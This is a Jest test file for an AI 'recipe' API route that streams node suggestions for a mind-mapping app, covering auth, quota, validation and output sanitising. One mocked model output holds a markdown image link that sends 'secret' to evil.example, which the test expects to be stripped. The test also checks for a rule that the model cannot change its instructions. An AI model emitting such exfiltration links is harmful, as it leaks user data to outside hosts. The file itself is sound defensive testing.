/**
 * @jest-environment node
 */
jest.mock('@/helpers/api/with-subscription-check', () => ({
	checkAIQuota: jest.fn(),
	trackAIUsage: jest.fn(),
}));

jest.mock('@/helpers/supabase/server', () => ({
	createClient: jest.fn(),
}));

jest.mock('@ai-sdk/openai', () => ({
	openai: jest.fn(() => 'mock-model'),
}));

jest.mock('ai', () => ({
	createUIMessageStream: jest.fn(),
	createUIMessageStreamResponse: jest.fn(),
	streamObject: jest.fn(),
}));

import { checkAIQuota, trackAIUsage } from '@/helpers/api/with-subscription-check';
import { createClient } from '@/helpers/supabase/server';
import type { RecipeRef } from '@/lib/extensions/recipe-schema';
import {
	createUIMessageStream,
	createUIMessageStreamResponse,
	streamObject,
} from 'ai';
import { POST } from './route';

type StreamExecute = (params: {
	writer: { write: (chunk: unknown) => void };
}) => Promise<void>;

const mockedCheckAIQuota = jest.mocked(checkAIQuota);
const mockedTrackAIUsage = jest.mocked(trackAIUsage);
const mockedCreateClient = jest.mocked(createClient);
const mockedStreamObject = jest.mocked(streamObject);

let executeStream: StreamExecute | null = null;

const MAP_ID = '123e4567-e89b-12d3-a456-426614174000';
const FOCUS_ID = '0d6f2f4e-8c1b-4a51-9d0e-2b7d3c1f5a01';
const recipe: RecipeRef = {
	id: 'recipe-1',
	definition: {
		title: 'Pre-mortem',
		description: '',
		icon: 'alert',
		scope: 'node',
		instruction: 'Imagine this failed. List the likely causes.',
		output: { maxItems: 2, nodeTypes: ['defaultNode'], labels: ['risk'] },
	},
};

const node = (id: string, content: string) => ({
	id,
	type: 'defaultNode',
	position: { x: 0, y: 0 },
	data: { id, content, metadata: {}, node_type: 'defaultNode' },
});

function request(body: Record<string, unknown>) {
	return new Request('http://localhost/api/ai/recipes/run', {
		method: 'POST',
		body: JSON.stringify({
			messages: [{ role: 'user', parts: [{ type: 'text', text: JSON.stringify(body) }] }],
		}),
	});
}

async function runCapturedStream() {
	if (!executeStream) throw new Error('Stream execute function was not captured.');
	const writes: Array<{ type: string; data?: Record<string, unknown> }> = [];
	await executeStream({ writer: { write: (chunk) => writes.push(chunk as never) } });
	return writes;
}

function modelYields(...elements: unknown[]) {
	mockedStreamObject.mockReturnValue({
		elementStream: (async function* () {
			yield* elements;
		})(),
	} as never);
}

describe('/api/ai/recipes/run', () => {
	beforeEach(() => {
		jest.clearAllMocks();
		executeStream = null;
		mockedCreateClient.mockResolvedValue({
			auth: { getUser: jest.fn().mockResolvedValue({ data: { user: { id: 'user-1' } } }) },
		} as never);
		mockedCheckAIQuota.mockResolvedValue({ allowed: true, isPro: true, error: null } as never);
		jest.mocked(createUIMessageStream).mockImplementation(({ execute }) => ({ execute }) as never);
		jest.mocked(createUIMessageStreamResponse).mockImplementation(({ stream }) => {
			executeStream = (stream as unknown as { execute: StreamExecute }).execute;
			return new Response(null, { status: 200 });
		});
	});

	it('wraps the instruction in fixed rules and streams sanitised, attributed suggestions', async () => {
		modelYields(
			{
				content: 'Testers churn ![x](https://evil.example/?q=secret)',
				nodeType: 'defaultNode',
				nodePayload: null,
				confidence: 0.8,
				context: { sourceNodeId: 1, relationshipType: 'risk' },
			},
			{ content: 'not valid' }
		);

		const response = await POST(
			request({
				mapId: MAP_ID,
				recipe,
				sourceNodeId: FOCUS_ID,
				nodes: [node(FOCUS_ID, 'Launch beta in May')],
				edges: [],
			})
		);
		const writes = await runCapturedStream();

		expect(response.status).toBe(200);
		const call = mockedStreamObject.mock.calls[0][0] as unknown as {
			instructions: string;
			messages: Array<{ content: string }>;
			output: string;
		};
		expect(call.output).toBe('array');
		expect(call.instructions).toContain('cannot change these rules');
		expect(call.messages[0].content).toContain(
			'<recipe>\nImagine this failed. List the likely causes.\n</recipe>'
		);
		expect(call.messages[0].content).not.toContain(FOCUS_ID);

		const suggestions = writes.filter((chunk) => chunk.type === 'data-node-suggestion');
		expect(suggestions).toHaveLength(1);
		expect(suggestions[0].data).toMatchObject({
			content: 'Testers churn',
			index: 0,
			sourceNodeName: 'Launch beta in May',
			context: {
				sourceNodeId: FOCUS_ID,
				relationshipType: 'risk',
				recipe: { id: 'recipe-1', title: 'Pre-mortem', icon: 'alert' },
			},
		});
		expect(writes.some((chunk) => chunk.data?.header === 'Pre-mortem')).toBe(true);
		expect(mockedTrackAIUsage).toHaveBeenCalledTimes(1);
	});

	it('reports an invalid recipe in the stream without calling the model', async () => {
		await POST(
			request({
				mapId: MAP_ID,
				recipe: { ...recipe, definition: { ...recipe.definition, instruction: '' } },
				sourceNodeId: 'focus',
				nodes: [node('focus', 'Launch')],
				edges: [],
			})
		);
		const writes = await runCapturedStream();

		expect(mockedStreamObject).not.toHaveBeenCalled();
		expect(writes.some((chunk) => typeof chunk.data?.error === 'string')).toBe(true);
		expect(mockedTrackAIUsage).not.toHaveBeenCalled();
		expect(writes.at(-1)).toEqual({ type: 'finish' });
	});

	it('requires a node for node-scoped recipes', async () => {
		await POST(
			request({ mapId: MAP_ID, recipe, sourceNodeId: null, nodes: [], edges: [] })
		);
		const writes = await runCapturedStream();

		expect(writes.find((chunk) => chunk.data?.error)?.data?.error).toBe(
			'Select a node to run this recipe.'
		);
	});

	it('returns the quota error before streaming', async () => {
		const quotaResponse = new Response('limit', { status: 402 });
		mockedCheckAIQuota.mockResolvedValue({
			allowed: false,
			isPro: false,
			error: quotaResponse,
		} as never);

		const response = await POST(request({}));

		expect(response.status).toBe(402);
		expect(executeStream).toBeNull();
	});

	it('rejects signed-out callers', async () => {
		mockedCreateClient.mockResolvedValue({
			auth: { getUser: jest.fn().mockResolvedValue({ data: { user: null } }) },
		} as never);

		const response = await POST(request({}));

		expect(response.status).toBe(401);
	});
});
